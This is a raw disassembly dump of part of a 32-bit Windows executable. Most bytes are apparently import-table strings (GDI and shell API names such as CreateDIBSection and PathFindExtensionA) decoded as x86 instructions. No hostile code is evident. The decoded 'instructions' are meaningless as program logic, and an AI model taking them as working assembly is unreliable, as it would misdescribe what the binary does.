  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
